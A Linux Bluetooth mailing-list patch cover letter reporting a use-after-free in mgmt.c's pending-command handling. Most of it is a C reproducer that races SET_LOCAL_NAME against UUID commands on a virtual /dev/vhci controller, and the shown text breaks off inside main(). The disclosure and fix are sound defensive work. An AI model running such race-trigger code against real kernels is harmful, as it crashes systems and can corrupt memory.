Received: from mail-pl1-f176.google.com (mail-pl1-f176.google.com [209.85.214.176])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id EE7A73749EA
	for <linux-bluetooth@vger.kernel.org>; Thu, 23 Jul 2026 16:43:59 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.176
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1784825043; cv=none; b=WGxNBZswFOYoKODfrE5fb5OsZHkzRiTZPG3oTvG/eoJvU1LSslS1h4hpwV7S3l4+XtwsAwavHsVvVrNth/CgAMaMgcCU9OvhK5Nq9ZWslsi8kfRzSyMymUbUY742axy+UYxwLEbxVYipfDAFGz2U2xcj7jEi+pLB8QtNeY9CgzM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1784825043; c=relaxed/simple;
	bh=i29EYvK5y9BAWqf9uwb6ReqIfAATgL2XA5/naVx4aOM=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=eOQW0pcz0ICZzeQEr0vvQIZDPijxlb0rn3jnsTW03JCGhFsjeJfaI1hXLtV/1N38Vz4XxB/0M6vnN/erQzxIs41sG7py/3o9g7kIiiO0Qy31MbmFQ5cSpTRW2iD5rh8qVOcdU3dlezyaB6mnZKRY+0R5yz0sOZ/PwhjnxIiVWSM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=ckEFijjP; arc=none smtp.client-ip=209.85.214.176
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="ckEFijjP"
Received: by mail-pl1-f176.google.com with SMTP id d9443c01a7336-2caf228a910so7975645ad.2
        for <linux-bluetooth@vger.kernel.org>; Thu, 23 Jul 2026 09:43:59 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784825039; x=1785429839; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=jED/mO0+Y8IgZNlgOiLzbvQpLMFiKE7Dz5pLnN2e/pw=;
        b=ckEFijjP9MfvEW1xw5pRTiYQ31MwKm02XLi0WujaAtsTfao9snJ5xPZ+63LnAyawc7
         YYLFsf1TejZ6c2hvdEoXFCvlnCb1tG0szFvIC2lDEBT8REH6E7AFzJ+2q6GxPrD9n3Fv
         fe6WGEQ/lduGaJ6O78Xr2fYxXTNBj71i72B5+TFnwTzZ7lYUiWPzzYyl39tbUaH0SJLg
         4t9ML+dSJe5Zicl8e+leG66Zw0G4lrHcHS1h4U5F/Rb88Zp0O/e1UWjXOvjQb73jOG92
         MmuiqbJSVpXwC8rX/E6yE1KHNQIj6N9K/IzNzwHyAOANnSs6xTJ+SQmubzK5gV0pQkj0
         +XWw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784825039; x=1785429839;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=jED/mO0+Y8IgZNlgOiLzbvQpLMFiKE7Dz5pLnN2e/pw=;
        b=fnYcVjI1nYDkFeQZmLQ4KfJSiN4mP//ZEluN9IN0dW1Ii7r0jg9YolLzlAjR046oiy
         i5XAvGT9yjg7THtDLVx63GuitEBjEpfCKMgZoMEJomDR1AbYrhUJypBc8b0vFzscWiuL
         8N5oh2vbh/DzXsCBlXjbQrZ6FRzF/hdDXiuQKQey1pNvA9W5pVKzZ1lJEDkjiH7ttdk9
         QrYY7jixd+W7tIm0v2e4q7jBL9iFmnuHcZ6nSlTuoQ/t2qZBdhki4fjlQOMEtnOg9sDJ
         2jrNI0wU2cQXsnXVyeYAVpu6s1iYu8nx+qnjRDC1YowKhND6Cqk03EBCDwZDSMgcZcgN
         uspw==
X-Gm-Message-State: AOJu0YwKZq3rMU9lboEbZ5JZsV2JXQlHHMOq7hnm8swmQY2DixMZEbje
	0GagR7fOkrqajgLk3kMSbgcL2LUOXQtz1Jbt5H86XC6JrOW18P3y9t4LQ2lU5iu9Ocg=
X-Gm-Gg: AR+sD10cc/jSRBa3S0dWZuSz0aD3say8PcKSYp8Bwj7whheyREmnygjepSODv1jNbE0
	4aQgNEAdwhoXG+Guu7xAF8gXY9cwwJyg5KIzTO0eHuQD6pFU3pGTVKZ+zEZpvyBuzCv0ODTcfEx
	PcOdsWZRX4xQyjvKPuFYPF/hcUHyuXvNTv7BkpiVBd6A+KdIuKWxNdCBniju96ov2G+JsXvnIq4
	cRyn79Gbltpjm4Fz8/ND4yD/JGB/IVQlsOrBhXL+0FgA/8JlqY/L7cd5vDDNDkaNzo8wIQmCLaf
	ZZWLvqqvvfevX3+0YUoe+hkCu2CCpKkx5f2L+NKPaaAHLgT3iiG/a5z8tyb3NB8zfh8YIK40wKj
	37NaLYce+uARzaunVSR0VahZJuv4G6FVLEwowR35JSypR3VplhaZa5Y9J9Yb3ufDRYNvn8sX9EQ
	60y5eXnECcYyceFQLpSzY=
X-Received: by 2002:a17:903:908:b0:2c9:97a7:3278 with SMTP id d9443c01a7336-2cfa6c88151mr45511485ad.41.1784825038792;
        Thu, 23 Jul 2026 09:43:58 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2cf8efd7157sm37049025ad.18.2026.07.23.09.43.50
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 23 Jul 2026 09:43:58 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: linux-bluetooth@vger.kernel.org
Cc: marcel@holtmann.org,
	luiz.dentz@gmail.com,
	dmantipov@yandex.ru,
	vega@nebusec.ai,
	zihanx@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH 0/1] Bluetooth: fix pending command UAF in EIR updates
Date: Fri, 24 Jul 2026 00:43:45 +0800
Message-ID: <cover.1784746530.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: linux-bluetooth@vger.kernel.org
List-Id: <linux-bluetooth.vger.kernel.org>
List-Subscribe: <mailto:linux-bluetooth+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-bluetooth+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zihan Xi <zihanx@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated a bug in net/bluetooth/mgmt.c. The bug is
reachable by a root process via the Bluetooth management control socket
and a virtual HCI controller created through /dev/vhci. We've tested the
fix with the reproducer, and it should not affect other management
commands.

This series contains one patch:
  1/1 Bluetooth: mgmt: fix pending command UAF in EIR updates

We provide bug details, reproducer steps, and a crash log below.

---- details below ----

Bug details:

MGMT_OP_SET_LOCAL_NAME is handled asynchronously on powered controllers
and can run set_name_sync(). On a BR/EDR capable controller,
set_name_sync() updates the local name and then calls
hci_update_eir_sync(), which rebuilds EIR data. The EIR generation path
walks hdev->uuids while UUID management commands can add or remove
entries.

The helper pending_eir_or_class() is intended to serialize management
commands that can affect EIR or the class of device. However, it did not
include MGMT_OP_SET_LOCAL_NAME, so a powered local-name update could run
together with ADD_UUID or REMOVE_UUID. In addition,
pending_eir_or_class() walked hdev->mgmt_pending without holding
hdev->mgmt_pending_lock, although pending commands are added and removed
under that mutex. A command completion can therefore remove and free a
pending command while another thread is still inspecting it.

The patch takes hdev->mgmt_pending_lock while scanning hdev->mgmt_pending
and treats MGMT_OP_SET_LOCAL_NAME as an EIR/class-affecting command on
the powered asynchronous path. The busy check is done before copying the
new short name, so a rejected SET_LOCAL_NAME request does not modify
hdev->short_name.

The EIR/local-name serialization gap predates the hci_sync conversion.
For this UAF, the suitable stable/backport anchor is 6fe26f694c82,
which introduced hdev->mgmt_pending_lock and made the pending-command
list locking contract explicit while leaving pending_eir_or_class() as
an unlocked walker of the same list.

Reproducer:

  Host:
    gcc -O2 -g -Wall -Wextra -pthread -static -Icompat \
        -include endian.h -o poc.static poc.c -pthread
    make O=/var/cache/linux-patch/fix-bluetooth-eir-uaf-q7c-build \
        -j32 bzImage
    qemu-start-kernel.sh /var/cache/linux-patch/fix-bluetooth-eir-uaf-q7c \
        -r /mnt/d/WSL/ubuntu-home-lenovo/kernel-image

  Guest:
    cp poc.static /root/poc
    cp poc.sh /root/poc.sh
    chmod +x /root/poc /root/poc.sh
    /root/poc.sh 512 180

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

The stack trace below was decoded from the original QEMU log before
being inserted here.

------BEGIN poc.sh------

#!/bin/sh
set -eu

COUNT="${1:-512}"
DURATION="${2:-180}"

echo 0 > /proc/sys/kernel/panic_on_warn
dmesg -C || true

exec /root/poc "$COUNT" "$DURATION"

------END poc.sh--------

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define MGMT_OP_SET_POWERED        0x0005
#define MGMT_OP_SET_SSP            0x000b
#define MGMT_OP_SET_LOCAL_NAME     0x000f
#define MGMT_OP_ADD_UUID           0x0010
#define MGMT_OP_REMOVE_UUID        0x0011

#define MGMT_EV_CMD_COMPLETE       0x0001
#define MGMT_EV_CMD_STATUS         0x0002
#define MGMT_EV_INDEX_ADDED        0x0004

#define MGMT_STATUS_SUCCESS        0x00
#define MGMT_STATUS_BUSY           0x0a
#define MGMT_STATUS_INVALID_PARAMS 0x0d

#define MGMT_MAX_NAME_LENGTH       249
#define MGMT_MAX_SHORT_NAME_LENGTH 11

#define HCI_EV_CMD_COMPLETE        0x0e
#define HCI_OP_SET_EVENT_MASK      0x0c01
#define HCI_OP_RESET               0x0c03
#define HCI_OP_SET_EVENT_FLT       0x0c05
#define HCI_OP_WRITE_LOCAL_NAME    0x0c13
#define HCI_OP_READ_LOCAL_NAME     0x0c14
#define HCI_OP_WRITE_CA_TIMEOUT    0x0c16
#define HCI_OP_READ_STORED_LINK_KEY 0x0c0d
#define HCI_OP_WRITE_SCAN_ENABLE   0x0c1a
#define HCI_OP_WRITE_AUTH_ENABLE   0x0c20
#define HCI_OP_READ_CLASS_OF_DEV   0x0c23
#define HCI_OP_WRITE_CLASS_OF_DEV  0x0c24
#define HCI_OP_READ_VOICE_SETTING  0x0c25
#define HCI_OP_READ_NUM_SUPPORTED_IAC 0x0c38
#define HCI_OP_READ_CURRENT_IAC_LAP   0x0c39
#define HCI_OP_WRITE_INQUIRY_MODE  0x0c45
#define HCI_OP_WRITE_EIR           0x0c52
#define HCI_OP_WRITE_SSP_MODE      0x0c56
#define HCI_OP_READ_INQ_RSP_TX_POWER 0x0c58
#define HCI_OP_READ_LOCAL_VERSION  0x1001
#define HCI_OP_READ_LOCAL_COMMANDS 0x1002
#define HCI_OP_READ_LOCAL_FEATURES 0x1003
#define HCI_OP_READ_LOCAL_EXT_FEATURES 0x1004
#define HCI_OP_READ_BUFFER_SIZE    0x1005
#define HCI_OP_READ_BD_ADDR        0x1009

#define DEFAULT_UUID_COUNT         512
#define DEFAULT_DURATION_SEC       60
#define NAME_THREADS              1
#define CTRL_PATH                  "/dev/vhci"

struct mgmt_hdr {
	uint16_t opcode;
	uint16_t index;
	uint16_t len;
} __attribute__((packed));

struct mgmt_mode {
	uint8_t val;
} __attribute__((packed));

struct mgmt_cp_set_local_name {
	uint8_t name[MGMT_MAX_NAME_LENGTH];
	uint8_t short_name[MGMT_MAX_SHORT_NAME_LENGTH];
} __attribute__((packed));

struct mgmt_cp_add_uuid {
	uint8_t uuid[16];
	uint8_t svc_hint;
} __attribute__((packed));

struct mgmt_cp_remove_uuid {
	uint8_t uuid[16];
} __attribute__((packed));

struct mgmt_ev_cmd_complete {
	uint16_t opcode;
	uint8_t status;
	uint8_t data[];
} __attribute__((packed));

struct mgmt_ev_cmd_status {
	uint16_t opcode;
	uint8_t status;
} __attribute__((packed));

struct hci_command_hdr_le {
	uint16_t opcode;
	uint8_t plen;
} __attribute__((packed));

struct hci_rp_read_local_version {
	uint8_t status;
	uint8_t hci_ver;
	uint16_t hci_rev;
	uint8_t lmp_ver;
	uint16_t manufacturer;
	uint16_t lmp_subver;
} __attribute__((packed));

struct hci_rp_read_bd_addr {
	uint8_t status;
	bdaddr_t bdaddr;
} __attribute__((packed));

struct hci_rp_read_local_features {
	uint8_t status;
	uint8_t features[8];
} __attribute__((packed));

struct hci_rp_read_local_commands {
	uint8_t status;
	uint8_t commands[64];
} __attribute__((packed));

struct hci_rp_read_stored_link_key {
	uint8_t status;
	uint16_t max_keys;
	uint16_t num_keys;
} __attribute__((packed));

struct hci_rp_read_buffer_size {
	uint8_t status;
	uint16_t acl_mtu;
	uint8_t sco_mtu;
	uint16_t acl_max_pkt;
	uint16_t sco_max_pkt;
} __attribute__((packed));

struct hci_rp_read_class_of_dev {
	uint8_t status;
	uint8_t dev_class[3];
} __attribute__((packed));

struct hci_rp_read_local_name {
	uint8_t status;
	uint8_t name[248];
} __attribute__((packed));

struct hci_rp_read_voice_setting {
	uint8_t status;
	uint16_t voice_setting;
} __attribute__((packed));

struct hci_rp_read_num_supported_iac {
	uint8_t status;
	uint8_t num_iac;
} __attribute__((packed));

struct hci_rp_read_current_iac_lap {
	uint8_t status;
	uint8_t num_iac;
	uint8_t lap[3];
} __attribute__((packed));

struct hci_rp_read_inq_rsp_tx_power {
	uint8_t status;
	int8_t tx_power;
} __attribute__((packed));

struct hci_rp_read_local_ext_features {
	uint8_t status;
	uint8_t page;
	uint8_t max_page;
	uint8_t features[8];
} __attribute__((packed));

static const uint8_t race_uuid[16] = {
	0x10, 0x32, 0x54, 0x76, 0x98, 0xba, 0xdc, 0xfe,
	0x11, 0x22, 0x33, 0x44, 0xaa, 0xbb, 0xcc, 0xdd,
};

static volatile sig_atomic_t stop_flag;
static int vhci_fd = -1;
static uint16_t hci_index = HCI_DEV_NONE;
static int uuid_count = DEFAULT_UUID_COUNT;
static int duration_sec = DEFAULT_DURATION_SEC;
static unsigned long name_cmd_seq;
static pthread_mutex_t log_lock = PTHREAD_MUTEX_INITIALIZER;

static void die(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vfprintf(stderr, fmt, ap);
	va_end(ap);
	fputc('\n', stderr);
	exit(EXIT_FAILURE);
}

static void log_msg(const char *fmt, ...)
{
	va_list ap;

	pthread_mutex_lock(&log_lock);
	va_start(ap, fmt);
	vfprintf(stderr, fmt, ap);
	va_end(ap);
	fputc('\n', stderr);
	pthread_mutex_unlock(&log_lock);
}

static void set_timeouts(int fd)
{
	struct timeval tv = {
		.tv_sec = 2,
		.tv_usec = 0,
	};

	if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
		die("setsockopt(SO_RCVTIMEO): %s", strerror(errno));
}

static int open_mgmt_socket(void)
{
	struct sockaddr_hci addr;
	int fd;

	fd = socket(AF_BLUETOOTH, SOCK_RAW | SOCK_CLOEXEC, BTPROTO_HCI);
	if (fd < 0)
		die("socket(AF_BLUETOOTH): %s", strerror(errno));

	memset(&addr, 0, sizeof(addr));
	addr.hci_family = AF_BLUETOOTH;
	addr.hci_dev = HCI_DEV_NONE;
	addr.hci_channel = HCI_CHANNEL_CONTROL;

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind(HCI_CHANNEL_CONTROL): %s", strerror(errno));

	set_timeouts(fd);
	return fd;
}

static void drain_mgmt_socket(int fd)
{
	uint8_t buf[512];

	for (;;) {
		ssize_t n = read(fd, buf, sizeof(buf));

		if (n < 0) {
			if (errno == EAGAIN || errno == EWOULDBLOCK)
				return;
			die("read(mgmt): %s", strerror(errno));
		}
	}
}

static int mgmt_cmd(int fd, uint16_t opcode, uint16_t index,
		    const void *data, uint16_t len)
{
	uint8_t buf[1024];
	struct mgmt_hdr *hdr = (struct mgmt_hdr *)buf;
	size_t off = 0;

	memset(buf, 0, sizeof(buf));

	hdr->opcode = htole16(opcode);
	hdr->index = htole16(index);
	hdr->len = htole16(len);
	off += sizeof(*hdr);

	if (len > 0) {
		memcpy(buf + off, data, len);
		off += len;
	}

	if (write(fd, buf, off) != (ssize_t)off)
		die("write(mgmt 0x%04x): %s", opcode, strerror(errno));

	for (;;) {
		ssize_t n = read(fd, buf, sizeof(buf));
		struct mgmt_hdr *ev_hdr;

		if (n < 0) {
			if (errno == EAGAIN || errno == EWOULDBLOCK)
				return -ETIMEDOUT;
			die("read(mgmt response): %s", strerror(errno));
		}

		if ((size_t)n < sizeof(*ev_hdr))
			continue;

		ev_hdr = (struct mgmt_hdr *)buf;

		switch (le16toh(ev_hdr->opcode)) {
		case MGMT_EV_CMD_COMPLETE: {
			struct mgmt_ev_cmd_complete *cc;

			if (le16toh(ev_hdr->len) < sizeof(*cc))
				continue;
			cc = (struct mgmt_ev_cmd_complete *)(buf + sizeof(*ev_hdr));
			if (le16toh(cc->opcode) != opcode)
				continue;
			return cc->status ? -cc->status : 0;
		}
		case MGMT_EV_CMD_STATUS: {
			struct mgmt_ev_cmd_status *st;

			if (le16toh(ev_hdr->len) < sizeof(*st))
				continue;
			st = (struct mgmt_ev_cmd_status *)(buf + sizeof(*ev_hdr));
			if (le16toh(st->opcode) != opcode)
				continue;
			return st->status ? -st->status : 0;
		}
		default:
			break;
		}
	}
}

static void send_cc(int fd, uint16_t opcode, const void *rp, size_t rp_len)
{
	uint8_t buf[512];
	size_t len = 0;
	size_t off = 0;

	buf[len++] = HCI_EVENT_PKT;
	buf[len++] = HCI_EV_CMD_COMPLETE;
	buf[len++] = (uint8_t)(3 + rp_len);
	buf[len++] = 0x01;
	buf[len++] = opcode & 0xff;
	buf[len++] = opcode >> 8;
	if (rp_len > 0) {
		memcpy(buf + len, rp, rp_len);
		len += rp_len;
	}

	while (off < len) {
		ssize_t n = write(fd, buf + off, len - off);

		if (n > 0) {
			off += n;
			continue;
		}

		if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
			struct pollfd pfd = {
				.fd = fd,
				.events = POLLOUT,
			};
			int ret = poll(&pfd, 1, 1000);

			if (ret == 0)
				die("poll(POLLOUT /dev/vhci): timed out");
			if (ret < 0 && errno != EINTR)
				die("poll(POLLOUT /dev/vhci): %s", strerror(errno));
			continue;
		}

		if (n < 0 && errno == EINTR)
			continue;

		die("write(vhci cmd complete): %s", strerror(errno));
	}
}

static void send_status_only(int fd, uint16_t opcode, uint8_t status)
{
	send_cc(fd, opcode, &status, sizeof(status));
}

static void handle_command_packet(const uint8_t *buf, size_t len)
{
	const struct hci_command_hdr_le *cmd;
	uint16_t opcode;

	if (len < 1 + sizeof(*cmd))
		return;

	if (buf[0] != HCI_COMMAND_PKT)
		return;

	cmd = (const struct hci_command_hdr_le *)(buf + 1);
	opcode = le16toh(cmd->opcode);

	switch (opcode) {
	case HCI_OP_RESET:
	case HCI_OP_SET_EVENT_MASK:
	case HCI_OP_SET_EVENT_FLT:
	case HCI_OP_WRITE_CA_TIMEOUT:
	case HCI_OP_WRITE_SSP_MODE:
	case HCI_OP_WRITE_AUTH_ENABLE:
	case HCI_OP_WRITE_INQUIRY_MODE:
	case HCI_OP_WRITE_EIR:
	case HCI_OP_WRITE_SCAN_ENABLE:
	case HCI_OP_WRITE_CLASS_OF_DEV:
		send_status_only(vhci_fd, opcode, 0x00);
		break;
	case HCI_OP_WRITE_LOCAL_NAME:
		__atomic_add_fetch(&name_cmd_seq, 1, __ATOMIC_RELAXED);
		usleep(100);
		send_status_only(vhci_fd, opcode, 0x00);
		break;
	case HCI_OP_READ_LOCAL_VERSION: {
		struct hci_rp_read_local_version rp = {
			.status = 0x00,
			.hci_ver = 0x09,
			.hci_rev = htole16(0x0001),
			.lmp_ver = 0x09,
			.manufacturer = htole16(0x000f),
			.lmp_subver = htole16(0x0001),
		};

		send_cc(vhci_fd, opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_BD_ADDR: {
		struct hci_rp_read_bd_addr rp;

		memset(&rp, 0, sizeof(rp));
		rp.status = 0x00;
		rp.bdaddr.b[0] = 0xbc;
		rp.bdaddr.b[1] = 0x9a;
		rp.bdaddr.b[2] = 0x78;
		rp.bdaddr.b[3] = 0x56;
		rp.bdaddr.b[4] = 0x34;
		rp.bdaddr.b[5] = 0x12;
		send_cc(vhci_fd, opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_LOCAL_FEATURES: {
		struct hci_rp_read_local_features rp;

		memset(&rp, 0, sizeof(rp));
		rp.status = 0x00;
		rp.features[3] = LMP_RSSI_INQ;
		rp.features[6] = LMP_EXT_INQ | LMP_SIMPLE_PAIR;
		rp.features[7] = LMP_INQ_TX_PWR | LMP_EXT_FEAT;
		send_cc(vhci_fd, opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_LOCAL_COMMANDS: {
		struct hci_rp_read_local_commands rp;

		memset(&rp, 0x00, sizeof(rp));
		rp.status = 0x00;
		send_cc(vhci_fd, opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_STORED_LINK_KEY: {
		struct hci_rp_read_stored_link_key rp = {
			.status = 0x00,
			.max_keys = htole16(0),
			.num_keys = htole16(0),
		};

		send_cc(vhci_fd, opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_BUFFER_SIZE: {
		struct hci_rp_read_buffer_size rp = {
			.status = 0x00,
			.acl_mtu = htole16(1021),
			.sco_mtu = 64,
			.acl_max_pkt = htole16(8),
			.sco_max_pkt = htole16(8),
		};

		send_cc(vhci_fd, opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_CLASS_OF_DEV: {
		struct hci_rp_read_class_of_dev rp = {
			.status = 0x00,
			.dev_class = { 0x00, 0x00, 0x00 },
		};

		send_cc(vhci_fd, opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_LOCAL_NAME: {
		struct hci_rp_read_local_name rp;

		memset(&rp, 0, sizeof(rp));
		rp.status = 0x00;
		memcpy(rp.name, "vhci-race", sizeof("vhci-race") - 1);
		send_cc(vhci_fd, opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_VOICE_SETTING: {
		struct hci_rp_read_voice_setting rp = {
			.status = 0x00,
			.voice_setting = htole16(0x0060),
		};

		send_cc(vhci_fd, opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_NUM_SUPPORTED_IAC: {
		struct hci_rp_read_num_supported_iac rp = {
			.status = 0x00,
			.num_iac = 0x01,
		};

		send_cc(vhci_fd, opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_CURRENT_IAC_LAP: {
		struct hci_rp_read_current_iac_lap rp = {
			.status = 0x00,
			.num_iac = 0x01,
			.lap = { 0x33, 0x8b, 0x9e },
		};

		send_cc(vhci_fd, opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_INQ_RSP_TX_POWER: {
		struct hci_rp_read_inq_rsp_tx_power rp = {
			.status = 0x00,
			.tx_power = 0,
		};

		send_cc(vhci_fd, opcode, &rp, sizeof(rp));
		break;
	}
	case HCI_OP_READ_LOCAL_EXT_FEATURES: {
		struct hci_rp_read_local_ext_features rp;

		memset(&rp, 0, sizeof(rp));
		rp.status = 0x00;
		rp.page = 0x01;
		rp.max_page = 0x01;
		send_cc(vhci_fd, opcode, &rp, sizeof(rp));
		break;
	}
	default:
		send_status_only(vhci_fd, opcode, 0x00);
		break;
	}
}

static void *controller_thread(void *unused)
{
	uint8_t buf[512];

	(void)unused;

	while (!stop_flag) {
		ssize_t n = read(vhci_fd, buf, sizeof(buf));

		if (n < 0) {
			if (errno == EAGAIN || errno == EWOULDBLOCK) {
				struct pollfd pfd = {
					.fd = vhci_fd,
					.events = POLLIN,
				};
				int ret = poll(&pfd, 1, 1000);

				if (ret < 0 && errno != EINTR)
					die("poll(POLLIN /dev/vhci): %s", strerror(errno));
				continue;
			}
			if (errno == EINTR)
				continue;
			die("read(/dev/vhci): %s", strerror(errno));
		}

		if (n == 0)
			continue;

		if (buf[0] == HCI_VENDOR_PKT && n >= 4) {
			hci_index = buf[2] | (buf[3] << 8);
			log_msg("vhci controller index: %u", hci_index);
			continue;
		}

		handle_command_packet(buf, n);
	}

	return NULL;
}

static void wait_for_hci_index(void)
{
	for (int i = 0; i < 100; i++) {
		if (hci_index != HCI_DEV_NONE)
			return;
		usleep(100000);
	}

	die("timed out waiting for vhci controller creation");
}

static void setup_controller_state(void)
{
	struct mgmt_mode on = { .val = 1 };
	int fd, err;

	fd = open_mgmt_socket();
	drain_mgmt_socket(fd);

	err = mgmt_cmd(fd, MGMT_OP_SET_SSP, hci_index, &on, sizeof(on));
	if (err)
		die("MGMT_OP_SET_SSP failed: %d", err);

	err = mgmt_cmd(fd, MGMT_OP_SET_POWERED, hci_index, &on, sizeof(on));
	if (err)
		die("MGMT_OP_SET_POWERED failed: %d", err);

	close(fd);
}

static void add_uuid_batch(void)
{
	struct mgmt_cp_add_uuid add;
	int fd;

	memset(&add, 0, sizeof(add));
	memcpy(add.uuid, race_uuid, sizeof(add.uuid));

	fd = open_mgmt_socket();
	drain_mgmt_socket(fd);

	for (int i = 0; i < uuid_count && !stop_flag; i++) {
		int err = mgmt_cmd(fd, MGMT_OP_ADD_UUID, hci_index,
				   &add, sizeof(add));

		if (err && err != -MGMT_STATUS_BUSY)
			die("MGMT_OP_ADD_UUID failed at %d: %d", i, err);
	}

	close(fd);
}

static void *name_thread(void *unused)
{
	struct mgmt_cp_set_local_name req;
	int fd, iter = 0;

	(void)unused;

	fd = open_mgmt_socket();
	drain_mgmt_socket(fd);

	memset(&req, 0, sizeof(req));

	while (!stop_flag) {
		int err;

		snprintf((char *)req.name, sizeof(req.name), "race-name-%08x", iter++);
		snprintf((char *)req.short_name, sizeof(req.short_name), "rn%06x",
			 iter);

		err = mgmt_cmd(fd, MGMT_OP_SET_LOCAL_NAME, hci_index,
			       &req, sizeof(req));
		if (err && err != -MGMT_STATUS_BUSY)
			log_msg("set_local_name returned %d", err);
	}

	close(fd);
	return NULL;
}

static void *mutator_thread(void *unused)
{
	struct mgmt_cp_add_uuid add;
	struct mgmt_cp_remove_uuid del;
	int fd;
	unsigned long seen;

	(void)unused;

	memset(&add, 0, sizeof(add));
	memset(&del, 0, sizeof(del));
	memcpy(add.uuid, race_uuid, sizeof(add.uuid));
	memcpy(del.uuid, race_uuid, sizeof(del.uuid));

	fd = open_mgmt_socket();
	drain_mgmt_socket(fd);
	seen = __atomic_load_n(&name_cmd_seq, __ATOMIC_RELAXED);

	while (!stop_flag) {
		while (!stop_flag) {
			unsigned long cur = __atomic_load_n(&name_cmd_seq,
							    __ATOMIC_RELAXED);

			if (cur != seen) {
				seen = cur;
				break;
			}

			usleep(50);
		}

		if (stop_flag)
			break;

		{
			int err = mgmt_cmd(fd, MGMT_OP_REMOVE_UUID, hci_index,
					   &del, sizeof(del));

			if (err && err != -MGMT_STATUS_BUSY &&
			    err != -MGMT_STATUS_INVALID_PARAMS)
				log_msg("remove_uuid returned %d", err);
		}

		for (int i = 0; i < uuid_count && !stop_flag; i++) {
			int err = mgmt_cmd(fd, MGMT_OP_ADD_UUID, hci_index,
					   &add, sizeof(add));

			if (err && err != -MGMT_STATUS_BUSY)
				log_msg("add_uuid returned %d at %d", err, i);
		}
	}

	close(fd);
	return NULL;
}

static void usage(const char *prog)
{
	fprintf(stderr, "Usage: %s [uuid_count] [duration_sec]\n", prog);
	exit(EXIT_FAILURE);
}

int main(int argc, char **argv)
{
	pthread_t ctrl, namer[NAME_THREADS], mutator;
	time_t end_time;

	if (argc > 3)
		usage(argv[0]);
	if (argc >= 2)
		uuid_count = atoi(argv[1]);
	if (argc == 3)
		duration_sec = atoi(argv[2]);
	if (uuid_count <= 0 || duration_sec <= 0)
		usage(argv[0]);

	signal(SIGPIPE, SIG_IGN);

	vhci_fd = open(CTRL_PATH, O_RDWR | O_CLOEXEC | O_NONBLOCK);
	if (vhci_fd < 0)
		die("open(%s): %s", CTRL_PATH, strerror(errno));

	if (pthread_create(&ctrl, NULL, controller_thread, NULL) != 0)
		die("pthread_create(controller_thread): %s", strerror(errno));

	wait_for_hci_index();
	setup_controller_state();

	log_msg("pre-filling %d UUIDs", uuid_count);
	add_uuid_batch();
	log_msg("prefill complete");

	for (int i = 0; i < NAME_THREADS; i++) {
		if (pthread_create(&namer[i], NULL, name_thread, NULL) != 0)
			die("pthread_create(name_thread): %s", strerror(errno));
	}
	if (pthread_create(&mutator, NULL, mutator_thread, NULL) != 0)
		die("pthread_create(mutator_thread): %s", strerror(errno));

	end_time = time(NULL) + duration_sec;
	while (!stop_flag && time(NULL) < end_time)
		sleep(1);

	stop_flag = 1;
